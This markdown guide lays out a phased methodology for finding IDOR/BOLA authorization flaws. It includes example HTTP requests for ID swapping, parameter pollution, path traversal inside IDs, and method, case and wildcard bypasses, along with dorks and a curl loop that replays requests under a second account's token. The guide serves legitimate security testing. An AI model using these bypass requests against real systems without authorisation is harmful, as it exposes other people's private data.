# 🔓 IDOR (Insecure Direct Object Reference) Methodology

> **A complete, structured approach to finding and confirming IDOR — from recon to automated two-account verification.**

---

<div align="center">

![Type](https://img.shields.io/badge/Vulnerability-IDOR%20%2F%20BOLA-red?style=for-the-badge)
![Scope](https://img.shields.io/badge/Scope-APIs%20%7C%20Web%20%7C%20GraphQL-orange?style=for-the-badge)
![Approach](https://img.shields.io/badge/Approach-Manual%20%2B%20Burp%20%2B%20Autorize-blue?style=for-the-badge)

</div>

---

## 📋 Table of Contents

1. [Introduction](#-introduction)
2. [Where to Find](#-where-to-find)
3. [Phase 1 — Recon & Setup](#-phase-1--recon--setup)
4. [Phase 2 — Basic ID Substitution](#-phase-2--basic-id-substitution)
5. [Phase 3 — Parameter & Endpoint Manipulation](#-phase-3--parameter--endpoint-manipulation)
6. [Phase 4 — Request Structure Manipulation](#-phase-4--request-structure-manipulation)
7. [Phase 5 — Encoded / Obfuscated ID Handling](#-phase-5--encoded--obfuscated-id-handling)
8. [Phase 6 — HTTP Method & Content-Type Tampering](#-phase-6--http-method--content-type-tampering)
9. [Phase 7 — Access Control Bypass Tricks](#-phase-7--access-control-bypass-tricks)
10. [Phase 8 — GraphQL IDOR](#-phase-8--graphql-idor)
11. [Phase 9 — Blind IDOR (No Visible Data Leak)](#-phase-9--blind-idor-no-visible-data-leak)
12. [Phase 10 — Automated Two-Account Verification](#-phase-10--automated-two-account-verification)
13. [Summary Workflow](#️-summary-workflow)
14. [Quick Decision Tree](#-quick-decision-tree)

---

## 📖 Introduction

IDOR (Insecure Direct Object Reference) is a vulnerability where a user can access or modify another user's data simply by referencing that data's identifier directly — because the server checks that the object exists, but never checks that the requester is actually allowed to touch it. In API-testing terminology this is also called **BOLA** (Broken Object Level Authorization).

---

## 🔍 Where to Find

```
- Almost always present in APIs — any endpoint returning or accepting
  a per-user/per-object identifier
- Look at every request containing an ID-like value: user_id, id,
  account_id, order_id, invoice_id, file_id, doc_id, ref, uuid
- Both READ endpoints (GET /profile/123) and WRITE endpoints
  (PUT/PATCH/DELETE /profile/123) — write-side IDOR is usually higher
  severity than read-side
- Object references hidden in headers, cookies, or hidden form fields,
  not just URL/body parameters
```

---

## 🧪 Phase 1 — Recon & Setup

```
1. Create TWO accounts on the target: Account A (yours) and
   Account B (a second low-privilege account) — this is non-negotiable,
   you cannot confirm IDOR with only one account
2. If roles exist, also grab a low-privileged AND a higher-privileged
   account to test vertical (not just horizontal) access
3. Walk through every feature as Account A, capturing every request
   in Burp — build a full map of ID-bearing endpoints
4. Repeat the same actions as Account B and note each object's ID
   (user_id, order_id, etc.) so you have known-good B-owned IDs to
   substitute into A's requests
5. For every captured request, ask: "does the server derive the
   target object from MY session, or from a value I control?"
   If it's a value you control → IDOR candidate
```

---

## 🎯 Phase 2 — Basic ID Substitution

The core test: repeat an authenticated request as Account A, but swap in Account B's object ID/reference, and check whether A's data still comes back or changes B's data.

```
GET /api/v1/users/profile/A_ID HTTP/1.1
Host: example.com
Authorization: Bearer <A_TOKEN>
```
Swap in B's ID while keeping A's auth:
```
GET /api/v1/users/profile/B_ID HTTP/1.1
Host: example.com
Authorization: Bearer <A_TOKEN>
```

### Adding a Missing Parameter

If an endpoint normally derives the user from the session with no visible ID, try forcing one in:

```
GET /api/v1/getuser HTTP/1.1
Host: example.com
```
```
GET /api/v1/getuser?id=1234 HTTP/1.1
Host: example.com
```

---

## 🧩 Phase 3 — Parameter & Endpoint Manipulation

### HTTP Parameter Pollution

```
POST /api/get_profile HTTP/1.1
Host: example.com

user_id=hacker_id&user_id=victim_id
```

### Add a File Extension

Some frameworks route `.json`/`.xml` suffixed paths through a different, less-guarded handler:

```
GET /v2/GetData/1234 HTTP/1.1
Host: example.com
```
```
GET /v2/GetData/1234.json HTTP/1.1
Host: example.com
```

### Test Outdated API Versions

Older versions often lack the access-control fixes applied to the current one:

```
POST /v2/GetData HTTP/1.1
Host: example.com

id=123
```
```
POST /v1/GetData HTTP/1.1
Host: example.com

id=123
```

---

## 🗂️ Phase 4 — Request Structure Manipulation

### Wrap the ID in an Array

```
POST /api/get_profile HTTP/1.1
Host: example.com

{"user_id":111}
```
```
POST /api/get_profile HTTP/1.1
Host: example.com

{"id":[111]}
```

### Wrap the ID in a Nested Object

```
POST /api/get_profile HTTP/1.1
Host: example.com

{"user_id":{"user_id":111}}
```

### JSON Parameter Pollution (duplicate keys)

```
POST /api/get_profile HTTP/1.1
Host: example.com

{"user_id":"hacker_id","user_id":"victim_id"}
```

### Path Traversal Within the ID Segment

```
GET /api/v1/users/profile/victim_id HTTP/1.1
Host: example.com
```
```
GET /api/v1/users/profile/my_id/../victim_id HTTP/1.1
Host: example.com
```

---

## 🎭 Phase 5 — Encoded / Obfuscated ID Handling

### Decode the ID First

If the ID looks like base64, hex, or an MD5 hash, decode it to see if it's just an encoded email/username — then try encoding a victim's known email/username the same way:

```
GET /GetUser/dmljdGltQG1haWwuY29t HTTP/1.1
Host: example.com
```
```
dmljdGltQG1haWwuY29t → base64-decodes to victim@mail.com
```

### Swap a UUID for a Sequential Number

Some backends accept both a UUID and a legacy numeric ID for the same object — the numeric path may have weaker checks:

```
GET /file?id=90ri2-xozifke-29ikedaw0d HTTP/1.1
Host: example.com
```
```
GET /file?id=302 HTTP/1.1
Host: example.com
```

---

## 🔀 Phase 6 — HTTP Method & Content-Type Tampering

### Change the HTTP Method

```
GET /api/v1/users/profile/111 HTTP/1.1
Host: example.com
```
```
POST /api/v1/users/profile/111 HTTP/1.1
Host: example.com
```

Also try `PUT`, `PATCH`, `DELETE` on read-only-looking endpoints — access control is sometimes only enforced on the "expected" verb.

### Change the Content-Type

```
GET /api/v1/users/1 HTTP/1.1
Host: example.com
Content-Type: application/xml
```
```
GET /api/v1/users/2 HTTP/1.1
Host: example.com
Content-Type: application/json
```

---

## 🛡️ Phase 7 — Access Control Bypass Tricks

### Case Manipulation (MFLAC — Missing Function Level Access Control)

```
GET /admin/profile HTTP/1.1
Host: example.com
```
```
GET /ADMIN/profile HTTP/1.1
Host: example.com
```

### Wildcard Instead of a Specific ID

```
GET /api/users/111 HTTP/1.1
Host: example.com
```
```
GET /api/users/* HTTP/1.1
Host: example.com
GET /api/users/% HTTP/1.1
Host: example.com
GET /api/users/_ HTTP/1.1
Host: example.com
GET /api/users/. HTTP/1.1
Host: example.com
```

### Google Dorking for Undiscovered Endpoints

```
site:example.com inurl:id=
site:example.com inurl:user_id=
site:example.com filetype:json inurl:api
```

---

## 🕸️ Phase 8 — GraphQL IDOR

```
GET /graphql HTTP/1.1
Host: example.com
```
```
GET /graphql.php?query= HTTP/1.1
Host: example.com
```

```
1. Enable/check introspection to enumerate all queries and mutations
2. Look for object-returning queries that accept an id/uuid argument
   (e.g. user(id: "111") { email, phone } )
3. Swap in another user's ID as Account A's authenticated session
4. Also check mutations for the same flaw — updateUser(id:, ...),
   deleteOrder(id:, ...) — write-side GraphQL IDOR is often missed
   because testers focus on queries only
```

---

## 🕶️ Phase 9 — Blind IDOR (No Visible Data Leak)

Not every IDOR returns data directly in the response — some only confirm success/failure, or trigger a side effect.

```
1. Status-code-only IDOR: response body doesn't change, but the
   HTTP status differs (200 vs 403) between an owned ID and someone
   else's — still proves the authorization check is missing/broken
2. Response-time IDOR: a valid-but-not-yours ID takes measurably
   longer/shorter than an invalid ID, hinting the object was found
   and processed even though access should've been denied
3. Side-effect IDOR: no data is returned, but the action still fires
   — e.g. DELETE /api/orders/{victim_order_id} returns 204 with no
   body, but the victim's order is genuinely gone
4. Second-order confirmation: if the response itself gives nothing
   away, log back in as the victim account (or check via an admin
   view) to confirm whether the object was actually read/changed
```

---

## 🤖 Phase 10 — Automated Two-Account Verification

🛠️ Tool: [Autorize](https://github.com/Quitten/Autorize) (Burp extension), [Authorize](https://github.com/PortSwigger/auth-analyzer) (alternative)

Manually swapping IDs across a large API surface doesn't scale — Autorize automates the "replay every request with a lower-privileged session" check across your whole crawl.

```
1. Install Autorize from the BApp Store
2. Log in as the LOW-privileged account (Account B) in Burp's browser
3. Paste Account B's session cookie/token into Autorize's config as
   the "unauthorized" session to test with
4. Browse the app normally AS ACCOUNT A (or replay a saved crawl) —
   Autorize automatically re-sends every request using B's session
5. Review the results table:
     - Bypassed  → B's session got A's data → confirmed IDOR
     - Enforced  → B correctly got a 401/403 → not vulnerable
     - Is Enforced?/Unknown → needs manual eyeballing (response looks
       different but isn't a clean 401/403 — check the body length
       and content manually)
```

```bash
# Bulk-scripted alternative when you already have both tokens and a
# list of endpoints to check systematically
for endpoint in $(cat endpoints.txt); do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN_B" \
    "https://example.com${endpoint}")
  echo "$endpoint -> $status"
done
```

---

## ⚔️ Summary Workflow

```
┌──────────────────────────────────────────────────────┐
│                   IDOR WORKFLOW                        │
├──────────────────────────────────────────────────────┤
│                                                        │
│  1. 🧪 Set Up Two Accounts (A + B), Map Every Request │
│            ↓                                          │
│  2. 🎯 Basic ID Substitution (swap B's ID into A's req)│
│            ↓                                          │
│  3. 🧩 Parameter/Endpoint Manipulation (HPP, .json,   │
│         old API versions)                              │
│            ↓                                          │
│  4. 🗂️ Request Structure Tricks (array/object wrap,   │
│         JSON pollution, path traversal in ID)          │
│            ↓                                          │
│  5. 🎭 Decode/Re-encode IDs, Try UUID↔Numeric Swap     │
│            ↓                                          │
│  6. 🔀 Tamper HTTP Method & Content-Type              │
│            ↓                                          │
│  7. 🛡️ Case/Wildcard Access-Control Bypass Tricks     │
│            ↓                                          │
│  8. 🕸️ Repeat All of the Above for GraphQL            │
│            ↓                                          │
│  9. 🕶️ Check for Blind IDOR (status/timing/side-effect)│
│            ↓                                          │
│ 10. 🤖 Automate Full Coverage with Autorize            │
│            ↓                                          │
│ 11. 📝 Document & Report                              │
│                                                        │
└──────────────────────────────────────────────────────┘
```

---

## 🧠 Quick Decision Tree

```
Request contains an ID-like value (numeric, UUID, encoded)?
    ├── YES → swap it for another account's known ID (Phase 2)
    │
    ├── Numeric ID missing entirely? → try adding ?id= param (Phase 2)
    │
    ├── ID looks encoded (base64/hex/md5)? → decode it, encode a
    │   victim identifier the same way and substitute (Phase 5)
    │
    ├── Response unchanged with swapped ID? → check status code,
    │   response time, and side effects instead (Phase 9 — blind IDOR)
    │
    ├── Endpoint is GraphQL? → enumerate via introspection, test both
    │   queries AND mutations (Phase 8)
    │
    └── Straight substitution blocked/403'd? → try:
            - HTTP method swap (Phase 6)
            - Content-Type swap (Phase 6)
            - .json/.xml suffix (Phase 3)
            - older API version (Phase 3)
            - array/object-wrapped ID (Phase 4)
            - case-changed path / wildcard ID (Phase 7)

Testing a large API surface?
    → Skip to Autorize for automated two-account coverage (Phase 10)
```

---

### 📚 Resources

- 🔗 [@swaysThinking — IDOR bypass techniques](https://twitter.com/swaysThinking)
- 🔗 [OWASP — Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- 🔗 [PortSwigger — Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- 🔗 [Autorize (Burp Extension)](https://github.com/Quitten/Autorize)
- Companion docs: `API-Testing-Methodology.md`, `recon.md`

---

<div align="center">

### 🔥 Two accounts. One swapped ID. Confirm the missing check.

---

*Happy Hacking — responsibly and ethically* 🛡️

</div>
